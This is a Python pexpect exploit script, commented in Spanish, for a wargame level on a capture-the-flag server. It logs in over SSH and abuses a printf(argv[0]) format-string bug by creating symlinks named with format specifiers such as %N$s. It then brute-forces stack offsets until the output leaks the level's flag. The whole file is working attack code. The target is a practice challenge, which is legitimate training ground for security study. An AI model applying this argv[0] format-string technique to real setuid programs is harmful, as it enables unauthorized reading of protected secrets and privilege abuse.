#!/usr/bin/env python3

import pexpect

print("💀🔥 EXPLOIT FINAL CORRECTO 🔥💀")

child = pexpect.spawn("ssh -o StrictHostKeyChecking=no -p 10101 basic9@pwn.w3challs.com", timeout=30)
child.expect([b'password:', b'Password:'])
child.sendline(b"basic9")
child.expect([b'\\$'])
print("[✓] Conectado!")

# Ir a /tmp
child.sendline(b"cd /tmp && rm -rf test* 2>/dev/null")
child.expect([b'\\$'])

print("\n[*] Explotando printf(argv[0])...")
print("[*] Probando posiciones 130-140 (rango más probable)...")

found = False

for i in range(130, 141):
    # Crear symlink con format string como nombre
    cmd = f'ln -sf /home/basic9/basic9 "test{i}"'.encode()
    child.sendline(cmd)
    child.expect([b'\\$'], timeout=1)
    
    # Ejecutar con format string
    # El truco: printf imprimirá ./test134 pero si pasamos %134$s como segundo arg no funciona
    # Necesitamos que el NOMBRE sea el format string
    
    # Crear otro symlink con el format string real
    fs = f'%{i}$s'.replace('$', '\\$')  # Escapar $ para el shell
    cmd = f'ln -sf /home/basic9/basic9 "{fs}" 2>/dev/null'.encode()
    child.sendline(cmd)
    child.expect([b'\\$'], timeout=1)
    
    # Ejecutar
    cmd = f'./"{fs}" x 2>&1'.encode()
    child.sendline(cmd)
    
    try:
        index = child.expect([b'\\$', b'W3C', b'Segmentation'], timeout=2)
        
        if index == 1:  # W3C encontrado!
            output = child.before + child.after
            
            # Esperar más output
            child.expect([b'\\$'], timeout=2)
            output += child.before
            
            print(f"\n🔥🔥🔥 FLAG ENCONTRADA EN POSICIÓN {i} 🔥🔥🔥")
            
            # Decodificar
            try:
                output_str = output.decode('utf-8', errors='ignore')
            except:
                output_str = output.decode('latin-1', errors='ignore')
            
            # Buscar flag
            import re
            match = re.search(r'W3C\{[^\}]+\}', output_str)
            if match:
                print(f"\nFLAG: {match.group(0)}\n")
                found = True
                break
            else:
                # Buscar manualmente
                if 'W3C{' in output_str:
                    start = output_str.index('W3C{')
                    end = output_str.find('}', start)
                    if end != -1:
                        flag = output_str[start:end+1]
                        print(f"\nFLAG: {flag}\n")
                        found = True
                        break
                    else:
                        print(f"Flag parcial: {output_str[start:start+50]}")
    except:
        pass

if not found:
    print("\n[*] Probando rango extendido 100-200...")
    
    for i in range(100, 201, 5):
        # Probar de 5 en 5 para ser más rápido
        fs = f'%{i}$s'.replace('$', '\\$')
        cmd = f'ln -sf /home/basic9/basic9 "{fs}" 2>/dev/null && ./"{fs}" x 2>&1 | head -5'.encode()
        child.sendline(cmd)
        
        try:
            child.expect([b'\\$', b'W3C'], timeout=1)
            
            if b'W3C' in child.before or (child.after and b'W3C' in child.after):
                print(f"\n[!] Encontrado cerca de posición {i}")
                
                # Afinar la búsqueda
                for j in range(i-5, i+6):
                    fs2 = f'%{j}$s'.replace('$', '\\$')
                    cmd2 = f'ln -sf /home/basic9/basic9 "{fs2}" && ./"{fs2}" x 2>&1'.encode()
                    child.sendline(cmd2)
                    child.expect([b'\\$'], timeout=2)
                    
                    output = child.before
                    if b'W3C{' in output:
                        try:
                            output_str = output.decode('utf-8', errors='ignore')
                            import re
                            match = re.search(r'W3C\{[^\}]+\}', output_str)
                            if match:
                                print(f"\n🔥🔥🔥 FLAG EN POSICIÓN {j}: {match.group(0)} 🔥🔥🔥\n")
                                found = True
                                break
                        except:
                            pass
                
                if found:
                    break
        except:
            pass

child.close()
print("\n💀 FIN 💀")